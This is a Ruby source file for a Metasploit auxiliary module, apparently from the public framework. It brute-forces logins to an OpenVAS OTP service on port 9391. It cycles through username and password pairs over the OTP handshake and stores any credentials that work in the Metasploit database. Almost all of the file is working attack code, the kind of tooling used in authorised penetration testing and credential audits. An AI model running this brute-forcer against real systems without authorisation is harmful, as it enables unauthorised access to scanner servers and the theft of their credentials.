##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'OpenVAS OTP Login Utility',
      'Description' => 'This module attempts to authenticate to an OpenVAS OTP service.',
      'Author'      => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'     => MSF_LICENSE
    )
    register_options(
      [
        Opt::RPORT(9391),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false])
      ]
    )
  end

  def run_host(ip)
    begin
      print_status("#{msg} Connecting and checking username and passwords")
      each_user_pass do |user, pass|
        do_login(user, pass)
      end
    rescue ::Rex::ConnectionError
    rescue ::Exception => e
      vprint_error("#{msg} #{e.to_s} #{e.backtrace}")
    end
  end

  def otp_send(data=nil, con=true)
    begin
      @result=''
      @coderesult=''
      if (con)
        @connected=false
        connect
        select(nil,nil,nil,0.4)
      end
      @connected=true
      sock.put(data)
      @result=sock.get_once
    rescue ::Exception => err
      print_error("#{msg} Error: #{err.to_s}")
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user=nil,pass=nil)
    begin
      otp_send("< OTP/1.0 >\n",true) # send hello
      if @result !~ /\<\ OTP\/1\.0 \>/
        print_error("#{msg} OpenVAS OTP does not appear to be running: did not get response to OTP hello: #{@result}")
        return :abort
      end

      vprint_status("#{msg} Trying user:'#{user}' with password:'#{pass}'")
      otp_send(nil,!@connected)
      if @result !~ /User\ \:/
        print_error("#{msg} OpenVAS OTP did not send User request: #{@result}")
      end
      otp_send("#{user}\n",!@connected)
      if @result !~ /Password\ \:/
        print_error("#{msg} OpenVAS OTP did not send Password request: #{@result}")
      end
      otp_send("#{pass}\n",!@connected)
      if @result =~ /SERVER <|>.*<|> SERVER/is
        print_good("#{msg} SUCCESSFUL login for '#{user}' : '#{pass}'")
        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'openvas-otp',
          user: user,
          password: pass,
          proof: @result
        )
        disconnect
        @connected = false
        return :next_user
      else
        if (@connected)
          disconnect # Sometime openvas disconnect the client after wrongs attempts
          @connected = false
        end
        vprint_error("#{msg} Rejected user: '#{user}' with password: '#{pass}': #{@result}")
        return :fail
      end
      rescue ::Rex::ConnectionError
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

  def msg
    "#{rhost}:#{rport} OpenVAS OTP -"
  end
end
